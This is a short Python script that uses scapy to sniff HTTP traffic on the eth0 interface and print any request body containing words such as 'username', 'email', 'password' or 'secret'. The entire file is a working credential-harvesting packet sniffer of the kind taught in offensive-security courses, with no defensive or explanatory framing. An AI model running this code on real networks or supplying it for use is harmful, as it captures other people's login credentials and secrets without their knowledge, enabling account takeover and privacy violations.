#!/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniff_packet(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            
            keywords = ["username", "uname", "user", "email", "id", "password", "pass", "secret"]
            for keyword in keywords:
                if keyword in str(load):
                    print(load)
                    print("---------------------------------------------------------------------")
                    break


sniff_packet("eth0")
